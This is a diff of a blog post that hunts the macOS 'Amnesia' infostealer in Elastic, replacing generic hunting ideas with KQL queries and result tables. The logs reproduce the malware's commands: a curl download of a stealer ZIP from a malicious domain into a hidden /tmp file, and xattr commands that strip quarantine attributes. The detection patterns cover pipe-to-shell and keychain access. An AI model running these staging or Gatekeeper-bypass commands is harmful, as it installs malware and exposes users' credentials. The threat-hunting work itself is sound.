@@ -263,7 +263,7 @@
     "keywords": ["macOS","Threat Hunting","Elastic","Infostealer"],
     
     "mainEntityOfPage": "//localhost:1313/posts/amnesia-stealer/",
-    "wordCount":  8026 
+    "wordCount":  9173 
   }]
   </script>
 
@@ -697,7 +697,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2026-08-31T12:56:09&#43;08:00">31 August 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">38 mins</span>
+      <time datetime="2026-08-31T12:56:09&#43;08:00">31 August 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">44 mins</span>
     
 
     
@@ -797,24 +797,81 @@
       </ul>
     </li>
     <li><a href="#lessons-learnt">Lessons Learnt</a></li>
-    <li><a href="#hunting-and-detection-ideas">Hunting and detection ideas</a>
+    <li><a href="#hunting-and-detection-ideas">Hunting and detection ideas</a></li>
+    <li><a href="#behavior-hunting-rediscovering-amnesia-without-the-pid">Behavior Hunting: Rediscovering Amnesia Without the PID</a>
       <ul>
-        <li><a href="#curl-downloading-into-temporary-locations"><code>curl</code> downloading into temporary locations</a></li>
-        <li><a href="#pipe-to-shell-execution">Pipe-to-shell execution</a></li>
-        <li><a href="#payload-preparation-under-tmp">Payload preparation under <code>/tmp</code></a></li>
-        <li><a href="#ad-hoc-signing-of-temporary-binaries">Ad-hoc signing of temporary binaries</a></li>
-        <li><a href="#quarantine-and-extended-attribute-manipulation">Quarantine and extended-attribute manipulation</a></li>
-        <li><a href="#local-password-validation-with-dscl">Local password validation with <code>dscl</code></a></li>
-        <li><a href="#keychain-unlocking-from-the-command-line">Keychain unlocking from the command line</a></li>
-        <li><a href="#direct-access-to-credential-and-user-data-stores">Direct access to credential and user-data stores</a></li>
-        <li><a href="#apfs-snapshot-creation-and-mounting">APFS snapshot creation and mounting</a></li>
-        <li><a href="#temporary-collection-and-archive-creation">Temporary collection and archive creation</a></li>
-        <li><a href="#launchdaemon-and-launchagent-writes">LaunchDaemon and LaunchAgent writes</a></li>
-        <li><a href="#launchdaemon-registration-with-launchctl">LaunchDaemon registration with <code>launchctl</code></a></li>
+        <li><a href="#downloading-archives-into-tmp">Downloading Archives Into <code>/tmp</code></a>
+          <ul>
+            <li><a href="#result">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#hidden-files-under-temporary-directories">Hidden Files Under Temporary Directories</a>
+          <ul>
+            <li><a href="#result-1">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#quarantine-and-extended-attribute-manipulation">Quarantine and Extended Attribute Manipulation</a>
+          <ul>
+            <li><a href="#result-2">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#ad-hoc-code-signing">Ad-Hoc Code Signing</a>
+          <ul>
+            <li><a href="#result-3">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#cleanup-and-anti-forensics">Cleanup and Anti-Forensics</a>
+          <ul>
+            <li><a href="#result-4">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#apple-notes-collection-and-staging">Apple Notes Collection and Staging</a>
+          <ul>
+            <li><a href="#process-result">Process Result</a></li>
+            <li><a href="#file-result">File Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#host-and-system-discovery">Host and System Discovery</a>
+          <ul>
+            <li><a href="#result-5">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#password-validation-with-dscl">Password Validation With <code>dscl</code></a>
+          <ul>
+            <li><a href="#result-6">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#keychain-unlocking-and-direct-access">Keychain Unlocking and Direct Access</a>
+          <ul>
+            <li><a href="#result-7">Result</a></li>
+            <li><a href="#direct-keychain-access">Direct Keychain Access</a></li>
+          </ul>
+        </li>
+        <li><a href="#chromium-database-access">Chromium Database Access</a></li>
+        <li><a href="#archive-creation-with-ditto">Archive Creation With <code>ditto</code></a>
+          <ul>
+            <li><a href="#result-8">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#launchdaemon-persistence">LaunchDaemon Persistence</a></li>
+        <li><a href="#apfs-snapshot-mounting">APFS Snapshot Mounting</a>
+          <ul>
+            <li><a href="#result-9">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#hunts-that-returned-no-results">Hunts That Returned No Results</a>
+          <ul>
+            <li><a href="#system-audio-muting">System Audio Muting</a></li>
+            <li><a href="#telegram-tdata-collection">Telegram <code>tdata</code> Collection</a></li>
+            <li><a href="#applescript-credential-prompt">AppleScript Credential Prompt</a></li>
+            <li><a href="#headless-chromium-session-control">Headless Chromium Session Control</a></li>
+          </ul>
+        </li>
+        <li><a href="#takeaway">Takeaway</a></li>
+        <li><a href="#takeaway-1">Takeaway</a></li>
         <li><a href="#using-these-as-hunts-rather-than-standalone-detections">Using these as hunts rather than standalone detections</a></li>
       </ul>
     </li>
-    <li><a href="#takeaways">Takeaways</a></li>
   </ul>
 </nav>
   </div>
@@ -873,24 +930,81 @@
       </ul>
     </li>
     <li><a href="#lessons-learnt">Lessons Learnt</a></li>
-    <li><a href="#hunting-and-detection-ideas">Hunting and detection ideas</a>
+    <li><a href="#hunting-and-detection-ideas">Hunting and detection ideas</a></li>
+    <li><a href="#behavior-hunting-rediscovering-amnesia-without-the-pid">Behavior Hunting: Rediscovering Amnesia Without the PID</a>
       <ul>
-        <li><a href="#curl-downloading-into-temporary-locations"><code>curl</code> downloading into temporary locations</a></li>
-        <li><a href="#pipe-to-shell-execution">Pipe-to-shell execution</a></li>
-        <li><a href="#payload-preparation-under-tmp">Payload preparation under <code>/tmp</code></a></li>
-        <li><a href="#ad-hoc-signing-of-temporary-binaries">Ad-hoc signing of temporary binaries</a></li>
-        <li><a href="#quarantine-and-extended-attribute-manipulation">Quarantine and extended-attribute manipulation</a></li>
-        <li><a href="#local-password-validation-with-dscl">Local password validation with <code>dscl</code></a></li>
-        <li><a href="#keychain-unlocking-from-the-command-line">Keychain unlocking from the command line</a></li>
-        <li><a href="#direct-access-to-credential-and-user-data-stores">Direct access to credential and user-data stores</a></li>
-        <li><a href="#apfs-snapshot-creation-and-mounting">APFS snapshot creation and mounting</a></li>
-        <li><a href="#temporary-collection-and-archive-creation">Temporary collection and archive creation</a></li>
-        <li><a href="#launchdaemon-and-launchagent-writes">LaunchDaemon and LaunchAgent writes</a></li>
-        <li><a href="#launchdaemon-registration-with-launchctl">LaunchDaemon registration with <code>launchctl</code></a></li>
+        <li><a href="#downloading-archives-into-tmp">Downloading Archives Into <code>/tmp</code></a>
+          <ul>
+            <li><a href="#result">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#hidden-files-under-temporary-directories">Hidden Files Under Temporary Directories</a>
+          <ul>
+            <li><a href="#result-1">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#quarantine-and-extended-attribute-manipulation">Quarantine and Extended Attribute Manipulation</a>
+          <ul>
+            <li><a href="#result-2">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#ad-hoc-code-signing">Ad-Hoc Code Signing</a>
+          <ul>
+            <li><a href="#result-3">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#cleanup-and-anti-forensics">Cleanup and Anti-Forensics</a>
+          <ul>
+            <li><a href="#result-4">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#apple-notes-collection-and-staging">Apple Notes Collection and Staging</a>
+          <ul>
+            <li><a href="#process-result">Process Result</a></li>
+            <li><a href="#file-result">File Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#host-and-system-discovery">Host and System Discovery</a>
+          <ul>
+            <li><a href="#result-5">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#password-validation-with-dscl">Password Validation With <code>dscl</code></a>
+          <ul>
+            <li><a href="#result-6">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#keychain-unlocking-and-direct-access">Keychain Unlocking and Direct Access</a>
+          <ul>
+            <li><a href="#result-7">Result</a></li>
+            <li><a href="#direct-keychain-access">Direct Keychain Access</a></li>
+          </ul>
+        </li>
+        <li><a href="#chromium-database-access">Chromium Database Access</a></li>
+        <li><a href="#archive-creation-with-ditto">Archive Creation With <code>ditto</code></a>
+          <ul>
+            <li><a href="#result-8">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#launchdaemon-persistence">LaunchDaemon Persistence</a></li>
+        <li><a href="#apfs-snapshot-mounting">APFS Snapshot Mounting</a>
+          <ul>
+            <li><a href="#result-9">Result</a></li>
+          </ul>
+        </li>
+        <li><a href="#hunts-that-returned-no-results">Hunts That Returned No Results</a>
+          <ul>
+            <li><a href="#system-audio-muting">System Audio Muting</a></li>
+            <li><a href="#telegram-tdata-collection">Telegram <code>tdata</code> Collection</a></li>
+            <li><a href="#applescript-credential-prompt">AppleScript Credential Prompt</a></li>
+            <li><a href="#headless-chromium-session-control">Headless Chromium Session Control</a></li>
+          </ul>
+        </li>
+        <li><a href="#takeaway">Takeaway</a></li>
+        <li><a href="#takeaway-1">Takeaway</a></li>
         <li><a href="#using-these-as-hunts-rather-than-standalone-detections">Using these as hunts rather than standalone detections</a></li>
       </ul>
     </li>
-    <li><a href="#takeaways">Takeaways</a></li>
   </ul>
 </nav>
   </div>
@@ -2674,144 +2788,173 @@
     </span>
     
 </h2>
-<p>After reconstructing the sample-specific chain, I wanted to step away from the exact PIDs, filenames and domain used by Amnesia and think about which parts of the activity could be reused as broader macOS hunts. The queries below are intentionally behavioral. Most of the binaries involved are legitimate macOS utilities, so I would not treat a single match as malicious by itself.</p>
-<p>The useful context usually comes from:</p>
-<ul>
-<li>what spawned the process;</li>
-<li>where the executable or target file is located;</li>
-<li>whether several related commands occur within a short time window;</li>
-<li>whether sensitive files are accessed afterwards;</li>
-<li>and whether the sequence ends in execution, persistence, staging or network activity.</li>
-</ul>
 
-<h3 class="relative group"><code>curl</code> downloading into temporary locations
-    <div id="curl-downloading-into-temporary-locations" class="anchor"></div>
+<h2 class="relative group">Behavior Hunting: Rediscovering Amnesia Without the PID
+    <div id="behavior-hunting-rediscovering-amnesia-without-the-pid" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#curl-downloading-into-temporary-locations" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#behavior-hunting-rediscovering-amnesia-without-the-pid" aria-label="Anchor">#</a>
     </span>
     
-</h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;process&#34;
-</span></span><span class="line"><span class="cl">and process.name : &#34;curl&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;/tmp/&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>The event becomes more interesting when <code>curl</code> is downloading an executable, archive or script into <code>/tmp</code> or <code>/private/tmp</code>, especially when the file is subsequently handled by utilities such as:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">unzip
-</span></span><span class="line"><span class="cl">xattr
-</span></span><span class="line"><span class="cl">chmod
-</span></span><span class="line"><span class="cl">codesign
-</span></span><span class="line"><span class="cl">nohup
-</span></span><span class="line"><span class="cl">bash
-</span></span><span class="line"><span class="cl">sh</span></span></code></pre></div></div>
-<p>I would also review the parent process and destination domain. A temporary or unknown parent process contacting an uncommon external domain is more interesting than a known enterprise updater doing the same thing.</p>
-<p>A stronger sequence would look something like:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">curl download
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">archive extraction
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">xattr / chmod / codesign
-</span></span><span class="line"><span class="cl">    ↓
-</span></span><span class="line"><span class="cl">execution</span></span></code></pre></div></div>
-<p><strong>Common false positives</strong></p>
-<p>Developers, package managers, software installers, update frameworks, MDM tooling and administrative scripts can legitimately use <code>curl</code> with <code>/tmp</code>.</p>
-<p>In an enterprise environment I would use this as a hunting query rather than a standalone detection. The downloaded filename, parent process, destination domain and subsequent file activity provide the context needed to separate normal activity from something worth investigating. On its own, this query is likely to be noisy, so I would correlate matches with the destination domain, parent process and follow-on activity.</p>
+</h2>
+<p>The investigation above relied heavily on PID and PPID relationships to reconstruct Amnesia&rsquo;s activity. That works well once a suspicious process has been identified, but I also wanted to see how much of the same activity could be found without knowing the malware PID beforehand.</p>
+<p>The following hunts were derived from behaviors observed during the investigation. They are intended as hunting starting points rather than production-ready detections. In a real environment, most would require baselining and tuning.</p>
+<hr>
 
-<h3 class="relative group">Pipe-to-shell execution
-    <div id="pipe-to-shell-execution" class="anchor"></div>
+<h3 class="relative group">Downloading Archives Into <code>/tmp</code>
+    <div id="downloading-archives-into-tmp" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#pipe-to-shell-execution" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#downloading-archives-into-tmp" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<p>Another useful variation is looking for downloaded content being passed directly into a shell:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;process&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;curl&#34;*
-</span></span><span class="line"><span class="cl">and (
-</span></span><span class="line"><span class="cl">  process.command_line : *&#34;| bash&#34;* or
-</span></span><span class="line"><span class="cl">  process.command_line : *&#34;| sh&#34;*
-</span></span><span class="line"><span class="cl">)</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>This is more suspicious when the remote content is executed without first being written to a file.</p>
-<p>Useful pivots include:</p>
-<ul>
-<li>the remote domain;</li>
-<li>the parent shell;</li>
-<li>child processes created immediately afterwards;</li>
-<li>newly created files under <code>/tmp</code>;</li>
-<li>and additional <code>curl</code> processes spawned by the retrieved script.</li>
-</ul>
-<p><strong>Common false positives</strong></p>
-<p>Some legitimate installation scripts still use patterns such as:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">curl ... | bash</span></span></code></pre></div></div>
-<p>This is common in developer environments and bootstrap installers. The reputation of the source, user context and what the shell does afterwards are therefore important.</p>
+<p>The Amnesia bootstrap used <code>curl</code> to retrieve a ZIP archive and write it directly into <code>/tmp</code> using a hidden filename.</p>
+<p><strong>Hunting hypothesis:</strong> Command-line downloads of archives directly into temporary directories may indicate payload staging.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/curl&#34; and process.command_line : */tmp/* and process.command_line : *.zip*</code></pre></div>
 
-<h3 class="relative group">Payload preparation under <code>/tmp</code>
-    <div id="payload-preparation-under-tmp" class="anchor"></div>
+<h4 class="relative group">Result
+    <div id="result" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#payload-preparation-under-tmp" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:35.400</td>
+					<td><code>/usr/bin/curl</code></td>
+					<td><code>curl -sL https://debug.allllowef.space/otherassets/macos-hybrid-stealer.zip?t=2def3c01135&amp;b=se -o /tmp/._77002.zip</code></td>
+					<td><code>bash</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:44.928</td>
+					<td><code>/usr/bin/curl</code></td>
+					<td><code>curl -sL https://debug.allllowef.space/otherassets/macos-hybrid-stealer.zip?t=2def3c01135&amp;b=se -o /tmp/._77002.zip</code></td>
+					<td><code>bash</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>Both events show the same behavior: <code>curl</code> downloading a ZIP archive into the hidden path <code>/tmp/._77002.zip</code>.</p>
+<p>This is not malicious by itself. Installers and automation scripts commonly use <code>curl</code>. Hidden output paths, unusual external domains, shell parents and subsequent execution make the activity more interesting.</p>
+<p>Flag combinations such as <code>-fsSL</code> or <code>-fskL</code> may also appear in malware and adware installers, but should be treated as supporting context rather than indicators on their own.</p>
+<hr>
+
+<h3 class="relative group">Hidden Files Under Temporary Directories
+    <div id="hidden-files-under-temporary-directories" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#hidden-files-under-temporary-directories" aria-label="Anchor">#</a>
     </span>
     
 </h3>
-<p>Amnesia produced a particularly useful sequence involving several legitimate macOS utilities:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">event.category : &#34;process&#34;
-</span></span><span class="line"><span class="cl">and process.name : (
-</span></span><span class="line"><span class="cl">  &#34;xattr&#34; or
-</span></span><span class="line"><span class="cl">  &#34;chmod&#34; or
-</span></span><span class="line"><span class="cl">  &#34;codesign&#34; or
-</span></span><span class="line"><span class="cl">  &#34;nohup&#34;
-</span></span><span class="line"><span class="cl">)
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;/tmp/&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>The individual utilities are less important than the relationship between them. A newly downloaded binary under <code>/tmp</code> being handled by several of these processes within seconds is worth reviewing.</p>
-<p>For example:</p>
+<p>The bootstrap also created dot-prefixed artifacts such as:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/tmp/._77002.zip
+</span></span><span class="line"><span class="cl">/tmp/.com.apple.dt.77002</span></span></code></pre></div></div>
+<p>Rather than restricting the hunt to ZIP files, we can look more broadly for hidden files beneath temporary directories.</p>
+<p><strong>Hunting hypothesis:</strong> Hidden files created or modified beneath temporary directories may reveal payload staging, preparation or cleanup.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;file&#34; and file.path : */tmp/.*</code></pre></div>
+
+<h4 class="relative group">Result
+    <div id="result-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-1" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>file.path</th>
+					<th>event.action</th>
+					<th>event.type</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:33.047</td>
+					<td><code>/System/Library/CoreServices/Spotlight.app/Contents/MacOS/Spotlight</code></td>
+					<td><code>/Users/jason/Library/Biome/tmp/.tmp.GC5D0Wik</code></td>
+					<td><code>modification</code></td>
+					<td><code>change</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:44.925</td>
+					<td><code>/usr/bin/curl</code></td>
+					<td><code>/private/tmp/._77002.zip</code></td>
+					<td><code>modification</code></td>
+					<td><code>change</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.404</td>
+					<td><code>/bin/mv</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td><code>rename</code></td>
+					<td><code>change</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.581</td>
+					<td><code>/bin/rm</code></td>
+					<td><code>/private/tmp/._77002.zip</code></td>
+					<td><code>deletion</code></td>
+					<td><code>deletion</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.830</td>
+					<td><code>/usr/bin/codesign</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002.cstemp</code></td>
+					<td><code>modification</code></td>
+					<td><code>change</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.838</td>
+					<td><code>/usr/bin/codesign</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td><code>rename</code></td>
+					<td><code>change</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:47.885</td>
+					<td><code>/bin/rm</code></td>
+					<td><code>/private/tmp/.com.apple.dt.77002</code></td>
+					<td><code>deletion</code></td>
+					<td><code>deletion</code></td>
+			</tr>
+	</tbody>
+</table>
+<p>This hunt also returned legitimate Spotlight/Biome activity, which is useful when considering how the query would need to be baselined in a production environment.</p>
+<p>The Amnesia events form a much more interesting lifecycle:</p>
 <div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">download
-</span></span><span class="line"><span class="cl">   ↓
-</span></span><span class="line"><span class="cl">xattr
-</span></span><span class="line"><span class="cl">   ↓
-</span></span><span class="line"><span class="cl">chmod
-</span></span><span class="line"><span class="cl">   ↓
-</span></span><span class="line"><span class="cl">codesign
-</span></span><span class="line"><span class="cl">   ↓
-</span></span><span class="line"><span class="cl">nohup
-</span></span><span class="line"><span class="cl">   ↓
-</span></span><span class="line"><span class="cl">execution</span></span></code></pre></div></div>
-<p>The signal becomes stronger if the same parent process is responsible for most or all of the commands.</p>
-<p><strong>Common false positives</strong></p>
-<p>Developers, build systems, internal deployment tooling and application installers can legitimately prepare binaries under <code>/tmp</code>. A useful enterprise baseline would include expected developer tools, management agents and software installers that routinely use these commands.</p>
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">hidden temporary file
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">rename
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">code-signing activity
+</span></span><span class="line"><span class="cl">    ↓
+</span></span><span class="line"><span class="cl">deletion</span></span></code></pre></div></div>
+<p>A hidden file alone is weak evidence. Multiple related operations against the same object within seconds are much more useful.</p>
+<hr>
 
-<h3 class="relative group">Ad-hoc signing of temporary binaries
-    <div id="ad-hoc-signing-of-temporary-binaries" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#ad-hoc-signing-of-temporary-binaries" aria-label="Anchor">#</a>
-    </span>
-    
-</h3>
-<p>A more focused <code>codesign</code> hunt is:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">process.name : &#34;codesign&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;--sign -&#34;*
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;/tmp/&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p><code>--sign -</code> applies an ad-hoc signature.</p>
-<p>I would investigate cases where an unknown or recently downloaded executable under <code>/tmp</code> is ad-hoc signed shortly before execution.</p>
-<p>Useful context includes:</p>
-<ul>
-<li>who created the file;</li>
-<li>whether <code>chmod +x</code> occurred first;</li>
-<li>whether <code>xattr</code> was used against the same path;</li>
-<li>and what process launched the file afterwards.</li>
-</ul>
-<p><strong>Common false positives</strong></p>
-<p>Developers frequently ad-hoc sign test binaries during local development. Build systems, QA tooling and internal packaging workflows can also generate this activity. This becomes much more useful outside known development endpoints or when the parent process is unexpected.</p>
-
-<h3 class="relative group">Quarantine and extended-attribute manipulation
+<h3 class="relative group">Quarantine and Extended Attribute Manipulation
     <div id="quarantine-and-extended-attribute-manipulation" class="anchor"></div>
     
     <span
@@ -2820,252 +2963,851 @@
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">process.name : &#34;xattr&#34;
-</span></span><span class="line"><span class="cl">and (
-</span></span><span class="line"><span class="cl">  process.command_line : *&#34;com.apple.quarantine&#34;* or
-</span></span><span class="line"><span class="cl">  process.command_line : *&#34;-cr&#34;*
-</span></span><span class="line"><span class="cl">)</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p>Pay particular attention when <code>xattr</code> targets newly downloaded applications, binaries or archives under:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/tmp
-</span></span><span class="line"><span class="cl">/private/tmp
-</span></span><span class="line"><span class="cl">~/Downloads</span></span></code></pre></div></div>
-<p>A stronger pattern is:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">downloaded file
-</span></span><span class="line"><span class="cl">     ↓
-</span></span><span class="line"><span class="cl">xattr
-</span></span><span class="line"><span class="cl">     ↓
-</span></span><span class="line"><span class="cl">chmod
-</span></span><span class="line"><span class="cl">     ↓
-</span></span><span class="line"><span class="cl">codesign
-</span></span><span class="line"><span class="cl">     ↓
-</span></span><span class="line"><span class="cl">execution</span></span></code></pre></div></div>
-<p>An explicit command such as:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">xattr -d com.apple.quarantine &lt;file&gt;</span></span></code></pre></div></div>
-<p>is especially worth reviewing when performed by an unknown parent process.</p>
-<p><strong>Common false positives</strong></p>
-<p>Developers and administrators sometimes remove quarantine attributes from internal or unsigned applications. Security testing, software packaging and troubleshooting can also trigger this behavior. The target path and parent process matter more than <code>xattr</code> alone.</p>
+<p>Amnesia used <code>xattr</code> against the staged payload:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">xattr -cr /tmp/.com.apple.dt.77002
+</span></span><span class="line"><span class="cl">xattr -d com.apple.quarantine /tmp/.com.apple.dt.77002</span></span></code></pre></div></div>
+<p><code>xattr -cr</code> recursively clears extended attributes, while the second command explicitly deletes <code>com.apple.quarantine</code>.</p>
+<p><strong>Hunting hypothesis:</strong> Unexpected clearing of extended attributes or removal of <code>com.apple.quarantine</code> from recently downloaded files may indicate attempts to interfere with the normal macOS quarantine and Gatekeeper assessment path.</p>
+<div class="highlight-wrapper"><pre tabindex="0"><code class="language-kql" data-lang="kql">event.category : &#34;process&#34; and process.executable : &#34;/usr/bin/xattr&#34; and (process.command_line : *-cr* or process.command_line : *com.apple.quarantine*)</code></pre></div>
 
-<h3 class="relative group">Local password validation with <code>dscl</code>
-    <div id="local-password-validation-with-dscl" class="anchor"></div>
+<h4 class="relative group">Result
+    <div id="result-2" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
-        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#local-password-validation-with-dscl" aria-label="Anchor">#</a>
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#result-2" aria-label="Anchor">#</a>
     </span>
     
-</h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">process.name : &#34;dscl&#34;
-</span></span><span class="line"><span class="cl">and process.command_line : *&#34;-authonly&#34;*</span></span></code></pre></div></div>
-<p><strong>What to look for</strong></p>
-<p><code>dscl -authonly</code> validates a username and password against the local account database.</p>
-<p>It becomes much more interesting when spawned by:</p>
-<ul>
-<li>an unknown application;</li>
-<li>a hidden executable;</li>
-<li>a process running from <code>/tmp</code>;</li>
-<li>or something that has just displayed a password prompt.</li>
-</ul>
-<p>I would also look for follow-on activity such as:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sudo -S
-</span></span><span class="line"><span class="cl">security unlock-keychain
-</span></span><span class="line"><span class="cl">login.keychain-db access</span></span></code></pre></div></div>
-<p>If a password appears directly in the command line, that is another important clue.</p>
-<p><strong>Common false positives</strong></p>
-<p>IT support utilities, enrollment workflows, account-management scripts and enterprise tooling can legitimately validate local credentials. The parent executable and subsequent privileged actions are the most useful ways to distinguish them.</p>
+</h4>
+<table>
+	<thead>
+			<tr>
+					<th>@timestamp</th>
+					<th>process.executable</th>
+					<th>event.action</th>
+					<th>process.command_line</th>
+					<th>process.parent.command_line</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Aug 17, 2026 @ 06:49:45.594</td>
+					<td><code>/usr/bin/xattr</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>xattr -cr /tmp/.com.apple.dt.77002</code></td>
+					<td><code>bash</code></td>
+			</tr>
+			<tr>
+					<td>Aug 17, 2026 @ 06:51:22.052</td>
+					<td><code>/usr/bin/xattr</code></td>
+					<td><code>[fork, exec, end]</code></td>
+					<td><code>xattr -d com.apple.quarantine /tmp/.com.apple.dt.77002</code></td>
+					<td><code>/tmp/.com.apple.dt.77002</code></td>
